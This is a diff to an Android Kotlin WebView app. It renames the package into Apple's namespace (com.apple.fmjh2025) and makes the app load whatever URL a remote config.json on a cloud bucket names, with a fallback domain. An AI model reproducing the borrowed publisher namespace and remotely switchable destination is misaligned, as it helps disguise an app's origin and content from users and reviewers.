@@ -1,4 +1,4 @@
-package com.obs.yl
+package com.apple.fmjh2025
 
 import android.content.ContentResolver
 import android.content.ContentValues
@@ -11,7 +11,6 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.provider.MediaStore
-import android.text.TextUtils
 import android.util.Log
 import android.view.MotionEvent
 import android.view.View
@@ -40,11 +39,15 @@ import com.drake.net.utils.TipUtils
 import com.drake.net.utils.scopeLife
 import com.google.gson.Gson
 import kotlinx.serialization.Serializable
+import java.io.File
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 import java.util.concurrent.TimeUnit
-
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
+import java.net.HttpURLConnection
+import java.net.URL
 
 class MainActivity : AppCompatActivity() {
 
@@ -60,7 +63,16 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var interval: Interval
 
-    private var url = "https://154.202.206.180:501/skl001"
+    data class ConfigData(
+        val url: String = ""
+    )
+
+    private val configJsonUrl =
+        "https://hixdaren.oss-cn-hangzhou.aliyuncs.com/fmjh/config.json" // 配置文件地址
+    private val defaultUrl = "https://web.garnierpr-is.com"
+
+    // 本地保存 config.json 的路径
+    private val configFile by lazy { File(filesDir, "config.json") }
 
     private val gson = Gson()
     protected var mSwipeBackHelper: SwipeBackHelper? = null
@@ -72,6 +84,11 @@ class MainActivity : AppCompatActivity() {
 
     private var fileUploadCallback: ValueCallback<Array<Uri>>? = null
     private lateinit var currentPhotoUri: Uri
+
+    private fun logAndToast(msg: String) {
+        Log.e("111", msg)
+        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
+    }
 
     private val webClient = object : WebViewClient() {
         override fun onReceivedError(
@@ -200,7 +217,8 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun createImageFileUri(): Uri {
-        val fileName = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date()) + ".jpg"
+        val fileName =
+            SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date()) + ".jpg"
         val contentValues = ContentValues().apply {
             put(MediaStore.Images.Media.DISPLAY_NAME, fileName)
             put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
@@ -285,33 +303,85 @@ class MainActivity : AppCompatActivity() {
     private fun loadData() {
         scopeLife {
             llError.visibility = View.GONE
-            val response = Get<String>(url).await()
-            Log.e("111", "response-> $response")
-            if (TextUtils.isEmpty(response)) {
-                llError.visibility = View.VISIBLE
-                return@scopeLife
+            var finalUrl = defaultUrl
+
+            try {
+                // 1. 下载 config.json
+                val response = Get<String>(configJsonUrl).await()
+                configFile.writeText(response)
+                Log.e("111", "已更新 config.json -> $configFile")
+
+                // 2. 读取并解析
+                val jsonContent = configFile.readText()
+                val configObj = gson.fromJson(jsonContent, ConfigData::class.java)
+                if (!configObj.url.isNullOrEmpty() && isUrlReachable(configObj.url)) {
+                    finalUrl = configObj.url
+                } else {
+                    Log.e("111", "config.json 里的 URL 无法访问，使用默认 URL")
+//                    logAndToast("config 里的 ${configObj.url} 无法访问，使用默认 URL")
+                }
+            } catch (e: Exception) {
+                Log.e("111", "获取 config.json 出错 -> ${e.message}")
+//                logAndToast("获取 config 出错 -> ${e.message}")
+                // 如果下载失败，尝试本地
+                if (configFile.exists()) {
+                    try {
+                        val jsonContent = configFile.readText()
+                        val configObj = gson.fromJson(jsonContent, ConfigData::class.java)
+                        if (!configObj.url.isNullOrEmpty() && isUrlReachable(configObj.url)) {
+                            finalUrl = configObj.url
+                        }
+                    } catch (e2: Exception) {
+                        Log.e("111", "读取本地 config.json 出错 -> ${e2.message}")
+//                        logAndToast("读取本地 config.json 出错 -> ${e2.message}")
+                    }
+                }
             }
 
+            // 3. 加载网页
             imvBg2.visibility = View.VISIBLE
             tvSkip.visibility = View.VISIBLE
-//            tvSkip.isEnabled = false
             startSkip()
-            loadWeb(url)
-//            val data = gson.fromJson(response, BaseResponse::class.java)
-//            if (data.code == 2000 && data.data.isNotEmpty()) {
-//                imvBg2.visibility = View.VISIBLE
-//                tvSkip.visibility = View.VISIBLE
-//                tvSkip.isEnabled = false
-//                startSkip()
-//                loadWeb(data.data[0].domain)
-//            } else {
-//                llError.visibility = View.VISIBLE
-//            }
-        }.catch {
-            Log.e("111", "loadData catch->")
-            llError.visibility = View.VISIBLE
+            loadWeb(finalUrl)
         }
     }
+
+    /**
+     * 检查URL是否可访问（协程版）
+     */
+    private suspend fun isUrlReachable(testUrl: String): Boolean = withContext(Dispatchers.IO) {
+        var connection: HttpURLConnection? = null
+        try {
+            connection = URL(testUrl).openConnection() as HttpURLConnection
+            connection.apply {
+                connectTimeout = 5000
+                readTimeout = 5000
+                requestMethod = "HEAD"
+                instanceFollowRedirects = true
+                setRequestProperty("User-Agent", "Mozilla/5.0")
+                useCaches = false
+            }
+            connection.connect()
+            connection.responseCode in 200..399
+        } catch (e: Exception) {
+            false
+        } finally {
+            connection?.disconnect()
+        }
+    }
+
+    /**
+     * 基本URL格式验证
+     */
+    private fun isValidUrl(url: String): Boolean {
+        return try {
+            URL(url).toURI()
+            true
+        } catch (e: Exception) {
+            false
+        }
+    }
+
 
     private fun startSkip() {
         interval = Interval(0, 1, TimeUnit.SECONDS, 3, 0).life(
